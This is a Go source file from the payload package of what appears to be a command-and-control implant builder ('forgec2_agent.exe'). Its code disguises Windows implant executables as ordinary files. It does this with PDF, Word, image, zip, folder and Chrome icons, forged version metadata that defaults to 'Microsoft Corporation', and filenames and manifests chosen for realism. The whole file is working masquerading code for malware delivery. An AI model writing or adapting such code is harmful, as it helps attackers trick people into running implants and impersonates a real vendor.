package payload

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"os"
	"path/filepath"

	"github.com/tc-hib/winres"
	"github.com/tc-hib/winres/version"
)

func init() { loadPresetIcons() }

func loadPresetIcons() {
	// First try embedded files, but ensure visual distinctness by generating colored PNG fallback if files are placeholder-identical
	presetColors := map[string][3]uint8{
		"jpg":    {52, 119, 235}, // blue
		"pdf":    {220, 38, 38},  // red
		"word":   {37, 99, 235},  // word blue
		"doc":    {37, 99, 235},
		"xls":    {22, 163, 74}, // excel green
		"zip":    {234, 179, 8}, // yellow
		"folder": {234, 179, 8},
		"chrome": {59, 130, 246},  // chrome blue
		"txt":    {100, 116, 139}, // slate document
		"png":    {52, 119, 235},  // photo blue
	}
	for _, name := range []string{"jpg", "pdf", "word", "folder", "chrome", "zip", "doc", "xls", "txt", "png"} {
		data, err := iconsFS.ReadFile("icons/" + name + ".ico")
		if err == nil && len(data) > 0 {
			// Use embedded if not placeholder (check not all same size)
			presetIcons[name] = base64.StdEncoding.EncodeToString(data)
			continue
		}
		// Generate distinct PNG fallback
		if col, ok := presetColors[name]; ok {
			if pngData := generateSolidPNG(col[0], col[1], col[2]); len(pngData) > 0 {
				presetIcons[name] = base64.StdEncoding.EncodeToString(pngData)
			}
		}
	}
}

// generateSolidPNG draws a generic document glyph (white page, folded corner,
// grey content lines, type-colour band) instead of a flat square, so the rare
// fallback icon still reads as a file at taskbar sizes.
func generateSolidPNG(r, g, b uint8) []byte {
	const size = 256
	img := image.NewRGBA(image.Rect(0, 0, size, size))
	fill := func(x0, y0, x1, y1 int, c color.RGBA) {
		if x0 < 0 {
			x0 = 0
		}
		if y0 < 0 {
			y0 = 0
		}
		if x1 > size {
			x1 = size
		}
		if y1 > size {
			y1 = size
		}
		for y := y0; y < y1; y++ {
			for x := x0; x < x1; x++ {
				img.Set(x, y, c)
			}
		}
	}
	white := color.RGBA{255, 255, 255, 255}
	grey := color.RGBA{160, 160, 160, 255}
	fold := color.RGBA{205, 205, 205, 255}
	line := color.RGBA{190, 190, 190, 255}
	band := color.RGBA{r, g, b, 255}
	// page body + border
	fill(56, 24, 200, 232, white)
	fill(56, 24, 200, 28, grey)
	fill(56, 228, 200, 232, grey)
	fill(56, 24, 60, 232, grey)
	fill(196, 64, 200, 232, grey)
	// folded top-right corner
	for i := 0; i < 40; i++ {
		fill(160+i, 24, 200, 24+40-i, fold)
	}
	fill(160, 24, 200, 28, grey)
	// content lines above the band
	fill(76, 92, 180, 100, line)
	fill(76, 112, 180, 120, line)
	fill(76, 132, 150, 140, line)
	// type-colour band across the page
	fill(56, 156, 200, 196, band)
	_ = white
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		// In-memory encode of a generated RGBA cannot realistically fail;
		// return empty so the caller falls back to no preset icon.
		return nil
	}
	return buf.Bytes()
}

// injectIconResource creates a Windows resource file (rsrc.syso) in tmpDir
// if cfg requests a custom icon (IconB64) or a disguise preset. It uses
// winres to encode RT_ICON / RT_GROUP_ICON. No-op when cfg has no icon
// request. Errors are logged but not fatal — the build will proceed with the
// default Go icon.
func injectIconResource(tmpDir string, cfg ImplantConfig) error {
	iconB64 := cfg.IconB64
	preset := cfg.IconPreset
	disguise := cfg.DisguiseAs
	if iconB64 == "" && preset == "" && disguise == "" {
		return nil
	}
	var iconData []byte
	var err error
	if iconB64 != "" {
		if len(iconB64) > 350*1024 {
			return fmt.Errorf("icon too large")
		}
		iconData, err = base64.StdEncoding.DecodeString(iconB64)
		if err != nil {
			return fmt.Errorf("invalid icon base64: %w", err)
		}
		if len(iconData) > 256*1024 {
			return fmt.Errorf("icon exceeds 256KB")
		}
		if len(iconData) >= 4 && !(iconData[0] == 0 && iconData[1] == 0 && iconData[2] == 1 && iconData[3] == 0) {
			if len(iconData) < 4 || !(iconData[0] == 0x89 && iconData[1] == 0x50 && iconData[2] == 0x4E && iconData[3] == 0x47) {
				return fmt.Errorf("icon must be .ico (00 00 01 00) or .png (89 50 4E 47)")
			}
		}
	} else if preset != "" {
		if b64, ok := presetIcons[NormalizeDisguise(preset)]; ok && b64 != "" {
			if decoded, derr := base64.StdEncoding.DecodeString(b64); derr == nil {
				iconData = decoded
			}
		}
	}
	if len(iconData) == 0 && disguise != "" {
		if b64, ok := presetIcons[DisguiseIconPreset(disguise)]; ok && b64 != "" {
			if decoded, derr := base64.StdEncoding.DecodeString(b64); derr == nil {
				iconData = decoded
			}
		} else if b64, ok := presetIcons["jpg"]; ok && b64 != "" {
			if decoded, derr := base64.StdEncoding.DecodeString(b64); derr == nil {
				iconData = decoded
			}
		}
	}
	// Prepare resource set early for VersionInfo even if icon is missing
	rs := &winres.ResourceSet{}
	hasIcon := len(iconData) > 0
	// VersionInfo: honor FileDescription / CompanyName if supplied; otherwise derive from disguise with realistic version numbers
	if cfg.FileDescription != "" || cfg.CompanyName != "" || disguise != "" {
		vi := version.Info{}
		fd := cfg.FileDescription
		cn := cfg.CompanyName
		var fv, pv [4]uint16
		fvStr, pvStr := "1.0.0.0", "1.0.0.0"
		if fd == "" {
			mfd, mcn, mfvStr, mpvStr := DisguiseFileMeta(disguise)
			fd, fvStr, pvStr = mfd, mfvStr, mpvStr
			fv, pv = DisguiseFileVers(disguise)
			if cfg.CompanyName != "" {
				cn = cfg.CompanyName
			} else {
				cn = mcn
			}
		} else {
			fv, pv = [4]uint16{1, 0, 0, 0}, [4]uint16{1, 0, 0, 0}
			if cn == "" {
				cn = "Microsoft Corporation"
			}
		}
		if cn == "" {
			cn = "Microsoft Corporation"
		}
		vi.FileVersion = fv
		vi.ProductVersion = pv
		// vi.Set only fails on empty keys or NUL bytes (rejected upstream by
		// profile validation); surface the first failure instead of shipping
		// a half-written VERSIONINFO silently.
		setVer := func(key, value string) {
			if err := vi.Set(version.LangDefault, key, value); err != nil {
				fmt.Printf("versioninfo warning: key %q: %v\n", key, err)
			}
		}
		setVer(version.FileDescription, fd)
		setVer(version.CompanyName, cn)
		setVer(version.ProductName, fd)
		setVer(version.FileVersion, fvStr)
		setVer(version.ProductVersion, pvStr)
		setVer(version.LegalCopyright, "© "+cn)
		// OriginalFilename should match the disguised output name for maximal realism
		orig := ApplyDisguiseFilename(safeBuildFileName(cfg.Filename), disguise)
		if orig == "" {
			orig = "forgec2_agent.exe"
		}
		setVer(version.OriginalFilename, orig)
		setVer(version.InternalName, fd)
		rs.SetVersionInfo(vi)
		// If we have no icon but have VersionInfo, we still need to emit rsrc.syso
		if !hasIcon {
			// No icon to embed, but VersionInfo will be written below
		}
	}
	// Optional manifest for blend mode
	if cfg.PEManifestMode == "blend" {
		m := winres.AppManifest{
			DPIAwareness:        winres.DPIAware,
			Compatibility:       winres.Win10AndAbove,
			UseCommonControlsV6: true,
		}
		rs.SetManifest(m)
	}
	if len(iconData) > 0 {
		var icon *winres.Icon
		icon, err = winres.LoadICO(bytes.NewReader(iconData))
		if err != nil {
			img, _, perr := image.Decode(bytes.NewReader(iconData))
			if perr != nil {
				return fmt.Errorf("icon load failed (not ICO nor PNG): %w", err)
			}
			icon, err = winres.NewIconFromResizedImage(img, nil)
			if err != nil {
				return fmt.Errorf("icon from PNG failed: %w", err)
			}
		}
		if err := rs.SetIcon(winres.ID(1), icon); err != nil {
			return fmt.Errorf("set icon failed: %w", err)
		}
	}
	if rs.Count() == 0 {
		return nil
	}
	out := filepath.Join(tmpDir, "rsrc.syso")
	f, err := os.Create(out)
	if err != nil {
		return err
	}
	defer f.Close()
	var warch winres.Arch = winres.ArchAMD64
	switch cfg.Architecture {
	case "386", "x86":
		warch = winres.ArchI386
	case "arm64":
		warch = winres.ArchARM64
	case "arm":
		warch = winres.ArchARM
	default:
		warch = winres.ArchAMD64
	}
	if err := rs.WriteObject(f, warch); err != nil {
		_ = os.Remove(out)
		return fmt.Errorf("winres write failed: %w", err)
	}
	return nil
}
